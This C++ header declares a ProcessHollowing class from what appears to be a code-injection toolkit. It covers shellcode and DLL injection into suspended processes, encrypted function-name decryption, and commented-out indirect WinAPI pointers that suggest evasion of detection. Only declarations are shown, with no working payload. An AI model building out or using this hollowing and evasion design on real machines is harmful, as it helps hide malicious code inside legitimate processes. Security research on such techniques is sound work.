#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <iostream>
#include "system_utils/WinAPIWrapper.h"
#include "injection/dll/RemoteThreadDllInjector.h"
#include "injection/shellcode/ShellcodeInjector.h"
#include "Logger.h"

/*
typedef BOOL(WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* pSetThreadContext)(HANDLE, const CONTEXT*);
typedef BOOL(WINAPI* pResumeThread)(HANDLE);
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef BOOL(WINAPI* pGetThreadContext)(HANDLE, LPCONTEXT);

extern pCreateProcessA		CreateProcessA_Indirect;
extern pWriteProcessMemory  WriteProcessMemory_Indirect;
extern pVirtualProtectEx	VirtualProtectEx_Indirect;
extern pSetThreadContext	SetThreadContext_Indirect;
extern pResumeThread		ResumeThread_Indirect;
extern pVirtualAllocEx		VirtualAllocEx_Indirect;
extern pReadProcessMemory	ReadProcessMemory_Indirect;
extern pNtUnmapViewOfSection NtUnmapViewOfSection_Indirect;
extern pGetThreadContext	GetThreadContext_Indirect;
*/

class ProcessHollowing {
public:
	ProcessHollowing();
	bool InjectShellcode(const std::string& targetProcess, const std::vector<unsigned char>& shellcode);
	bool InjectDLL(const std::string& targetProcess, const std::string& dllPath);
private:
	PROCESS_INFORMATION _CreateSuspendedProcess(const std::string& targetProcess);
	CONTEXT _GetProcessContext(HANDLE hThread);
	PVOID _WriteShellcodeToProcess(HANDLE hProcess, const std::vector<unsigned char>& shellcode);
	VOID _SetContextAndResumeProcess(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, PVOID shellcodeAddress);
	std::string _DecryptFunctionName(std::vector<unsigned char>& encryptedName, unsigned char key);
	LPVOID _AllocateRemoteMemory(HANDLE hProcess, SIZE_T size);
	void _WriteRemoteMemory(HANDLE hProcess, LPVOID remoteAddress, const void* buffer, SIZE_T size);
	void _ResumeProcess(PROCESS_INFORMATION& pi);
	//LPVOID _GetLoadLibraryAddress();

	WinAPIWrapper api;
};
